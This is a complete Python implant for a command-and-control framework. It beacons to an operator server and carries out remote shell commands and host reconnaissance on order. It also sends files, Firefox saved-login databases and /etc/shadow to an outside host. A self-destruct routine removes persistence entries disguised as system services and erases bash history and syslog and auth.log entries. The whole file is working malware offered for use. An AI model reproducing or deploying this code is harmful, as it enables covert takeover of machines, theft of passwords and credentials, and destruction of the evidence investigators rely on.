#!/usr/bin/env python3

import json
import os
import random
import socket
import ssl
import struct
import subprocess
import sys
import time

try:
    from urllib.request import urlopen, Request
except ImportError:
    from urllib2 import urlopen, Request

from helper import (
    decrypt_message,
    deobfuscate,
    deserialize_public_key,
    encrypt_message,
    generate_keypair,
    obfuscate,
    serialize_public_key,
)

C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
C2_PORT = int(os.environ.get("C2_PORT", "443"))
EXFIL_HOST = os.environ.get("EXFIL_HOST", C2_HOST)
EXFIL_PORT = int(os.environ.get("EXFIL_PORT", "9443"))
BEACON_MIN = float(os.environ.get("BEACON_MIN", "4"))
BEACON_MAX = float(os.environ.get("BEACON_MAX", "12"))

# TLS - accept any cert since the C2 uses an ephemeral self-signed cert
_tls_ctx = ssl.create_default_context()
_tls_ctx.check_hostname = False
_tls_ctx.verify_mode = ssl.CERT_NONE

def _get_user():
    user = os.environ.get("USER") or os.environ.get("USERNAME")
    if not user:
        try:
            import pwd
            user = pwd.getpwuid(os.getuid()).pw_name
        except Exception:
            user = str(os.getuid())
    return user

_data_store = {
    "hostname": socket.gethostname(),
    "os": sys.platform,
    "user": _get_user(),
}


def _send(conn, data):
    conn.sendall(struct.pack(">I", len(data)) + data)


def _recv(conn):
    hdr = b""
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            raise ConnectionError("closed")
        hdr += c
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        c = conn.recv(length - len(buf))
        if not c:
            raise ConnectionError("closed")
        buf += c
    return buf


class _Shutdown(Exception):
    pass


class _Destroy(Exception):
    pass


def _ok(rid, payload):
    return {"type": "RESPONSE", "request_id": rid, "status": "OK", "payload": payload}


def _err(rid, code, message):
    return {"type": "ERROR", "request_id": rid, "error": {"code": code, "message": message}}


def _exfil_encode(data):
    """Rolling XOR + base64 encode"""
    import base64
    xored = bytes(b ^ ((0xAB + i) & 0xFF) for i, b in enumerate(data))
    return base64.b64encode(xored)


def _run(cmd, timeout=10):
    """Run a shell command, return (stdout_str, returncode)."""
    try:
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        out, _ = proc.communicate(timeout=timeout)
        return out.decode("utf-8", errors="replace").strip(), proc.returncode
    except subprocess.TimeoutExpired:
        proc.kill()
        return "TIMEOUT", -1
    except Exception as exc:
        return "ERROR: {0}".format(exc), -1


def _handle(msg):
    command = msg.get("command", "")
    rid = msg.get("request_id", "")
    payload = msg.get("payload", {})

    if command == "HEARTBEAT":
        return _ok(rid, {"message": "alive"})

    elif command == "SHUTDOWN":
        raise _Shutdown(rid)

    elif command == "DESTROY":
        raise _Destroy(rid)

    elif command == "SYSINFO":
        info = {
            "hostname": socket.gethostname(),
            "platform": sys.platform,
            "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "cwd": os.getcwd(),
            "pid": os.getpid(),
        }
        try:
            info["ip"] = socket.gethostbyname(socket.gethostname())
        except Exception:
            info["ip"] = "unknown"
        try:
            with open("/proc/uptime") as fh:
                info["uptime_s"] = float(fh.read().split()[0])
        except Exception:
            pass
        return _ok(rid, info)

    elif command == "RUN_CMD":
        cmd = payload.get("cmd", "")
        if not cmd:
            return _err(rid, 400, "No cmd provided")
        try:
            proc = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            try:
                stdout, stderr = proc.communicate(timeout=15)
            except subprocess.TimeoutExpired:
                proc.kill()
                return _err(rid, 408, "Command timed out")
            return _ok(rid, {
                "cmd": cmd,
                "stdout": stdout.decode("utf-8", errors="replace").strip(),
                "stderr": stderr.decode("utf-8", errors="replace").strip(),
                "returncode": proc.returncode,
            })
        except Exception as exc:
            return _err(rid, 500, str(exc))

    elif command == "EXFIL_FILE":
        path = payload.get("path", "")
        if not path:
            return _err(rid, 400, "No path provided")
        try:
            with open(path, "rb") as fh:
                data = fh.read()
        except Exception as exc:
            return _err(rid, 500, "Read failed: {0}".format(exc))
        filename = os.path.basename(path)
        url = "https://{0}:{1}/u?filename={2}".format(EXFIL_HOST, EXFIL_PORT, filename)
        try:
            req = Request(url, data=_exfil_encode(data))
            req.add_header("X-Enc", "rxb64")
            urlopen(req, timeout=10, context=_tls_ctx)
            return _ok(rid, {"path": path, "bytes": len(data), "exfil_to": url})
        except Exception as exc:
            return _err(rid, 500, "Exfil POST failed: {0}".format(exc))

    elif command == "DELETE_FILE":
        path = payload.get("path", "")
        if not path:
            return _err(rid, 400, "No path provided")
        try:
            os.remove(path)
            return _ok(rid, {"message": "Deleted {0}".format(path)})
        except Exception as exc:
            return _err(rid, 500, str(exc))

    elif command == "RECON_BUNDLE":
        # run multiple commands
        cmds = [
            ("whoami",         "whoami"),
            ("id",             "id"),
            ("hostname",       "hostname"),
            ("kernel",         "uname -a"),
            ("os_release",     "cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null"),
            ("network",        "ip addr 2>/dev/null || ifconfig 2>/dev/null"),
            ("listening",      "ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null"),
            ("arp",            "ip neigh 2>/dev/null || arp -n 2>/dev/null"),
            ("processes",      "ps aux --no-headers 2>/dev/null | head -30"),
            ("users",          "cat /etc/passwd | grep -vE '(nologin|false|sync|halt|shutdown)'"),
            ("sudo_check",     "sudo -n -l 2>&1"),
            ("suid_bins",      "find / -perm -u=s -type f 2>/dev/null | head -20"),
            ("crontabs",       "crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null"),
            ("writable_etc",   "find /etc /usr/local/bin /usr/bin -writable -type f 2>/dev/null | head -10"),
            ("home_files",     "find {0} -maxdepth 3 -type f 2>/dev/null | head -30".format(
                os.path.expanduser("~"))),
            ("env_vars",       "env"),
            ("disk",           "df -h 2>/dev/null"),
        ]
        results = {}
        for key, cmd in cmds:
            out, _ = _run(cmd, timeout=10)
            results[key] = out
        return _ok(rid, results)

    elif command == "FIREFOX_EXFIL":
        # Find the most recently modified Firefox default profile, exfil key4.db + logins.json
        profile_out, _ = _run("ls -dt ~/.mozilla/firefox/*.default* 2>/dev/null | head -1")
        profile_dir = os.path.expanduser(profile_out.strip())
        if not profile_dir or not os.path.isdir(profile_dir):
            return _err(rid, 404, "No Firefox profile found at {0}".format(profile_dir))
        results = {"profile": profile_dir}
        for fname in ["key4.db", "logins.json", "cert9.db"]:
            fpath = os.path.join(profile_dir, fname)
            if not os.path.isfile(fpath):
                results[fname] = "not found"
                continue
            try:
                with open(fpath, "rb") as fh:
                    data = fh.read()
                url = "https://{0}:{1}/u?filename={2}".format(EXFIL_HOST, EXFIL_PORT, fname)
                req = Request(url, data=_exfil_encode(data))
                req.add_header("X-Enc", "rxb64")
                urlopen(req, timeout=10, context=_tls_ctx)
                results[fname] = "{0} bytes sent".format(len(data))
            except Exception as exc:
                results[fname] = "failed: {0}".format(exc)
        return _ok(rid, results)

    elif command == "SHADOW_EXFIL":
        path = "/etc/shadow"
        try:
            with open(path, "rb") as fh:
                data = fh.read()
        except Exception as exc:
            return _err(rid, 500, "Read failed: {0}".format(exc))
        url = "https://{0}:{1}/u?filename=shadow".format(EXFIL_HOST, EXFIL_PORT)
        try:
            req = Request(url, data=_exfil_encode(data))
            req.add_header("X-Enc", "rxb64")
            urlopen(req, timeout=10, context=_tls_ctx)
            return _ok(rid, {"bytes": len(data), "exfil_to": url})
        except Exception as exc:
            return _err(rid, 500, "Exfil POST failed: {0}".format(exc))

    else:
        return _err(rid, 400, "Unknown command: {0!r}".format(command))


def beacon():
    while True:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with _tls_ctx.wrap_socket(raw, server_hostname=C2_HOST) as s:
                s.connect((C2_HOST, C2_PORT))

                priv_key, pub_key = generate_keypair()
                _send(s, serialize_public_key(pub_key))
                server_pub = deserialize_public_key(_recv(s))

                reg = {
                    "type": "REQUEST",
                    "command": "REGISTER",
                    "request_id": "reg-{0}".format(id(s)),
                    "payload": {
                        "hostname": _data_store["hostname"],
                        "os": _data_store["os"],
                        "user": _data_store["user"],
                    },
                }
                _send(s, obfuscate(encrypt_message(json.dumps(reg).encode(), server_pub)))
                ack_raw = _recv(s)
                json.loads(decrypt_message(deobfuscate(ack_raw), priv_key).decode())

                while True:
                    raw_msg = _recv(s)
                    msg = json.loads(decrypt_message(deobfuscate(raw_msg), priv_key).decode())
                    try:
                        resp = _handle(msg)
                    except _Shutdown as sig:
                        shut = _ok(str(sig), {"message": "Shutting down."})
                        _send(s, obfuscate(encrypt_message(json.dumps(shut).encode(), server_pub)))
                        return
                    except _Destroy as sig:
                        ack = _ok(str(sig), {"message": "Destroying."})
                        _send(s, obfuscate(encrypt_message(json.dumps(ack).encode(), server_pub)))
                        # Remove own binary + known install paths
                        own = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
                        for path in [own, "/usr/bin/dbus-sync", "/usr/lib/systemd/systemd-networkd-wait"]:
                            try:
                                os.remove(path)
                            except Exception:
                                pass
                        # Remove init.d scripts + rc symlinks directly (no update-rc.d to avoid polkit)
                        for name in ["dbus-sync", "network-manager-dispatcher", "systemd-networkd-wait"]:
                            _run("rm -f /etc/init.d/{0}".format(name))
                            _run("rm -f /etc/rc*.d/*{0}".format(name))
                        # Scrub crontab of any entry pointing at our binary
                        proc = subprocess.Popen(
                            "crontab -l 2>/dev/null",
                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        )
                        existing, _ = proc.communicate()
                        cleaned = "\n".join(
                            line for line in existing.decode("utf-8", errors="replace").splitlines()
                            if own not in line and "dbus-sync" not in line and "nm-dispatcher" not in line
                        )
                        proc2 = subprocess.Popen(
                            "crontab -", shell=True, stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        )
                        proc2.communicate(input=cleaned.encode())
                        # Wipe traces
                        _run("history -c; history -w; cat /dev/null > ~/.bash_history")
                        _run("sed -i '/dbus-sync\\|nm-dispatcher/d' /var/log/syslog 2>/dev/null")
                        _run("sed -i '/dbus-sync\\|nm-dispatcher/d' /var/log/auth.log 2>/dev/null")
                        os.kill(os.getpid(), 9)
                    _send(s, obfuscate(encrypt_message(json.dumps(resp).encode(), server_pub)))

        except (ConnectionRefusedError, ConnectionError, OSError):
            time.sleep(random.uniform(BEACON_MIN, BEACON_MAX))
        except Exception:
            time.sleep(random.uniform(BEACON_MIN, BEACON_MAX))


if __name__ == "__main__":
    beacon()
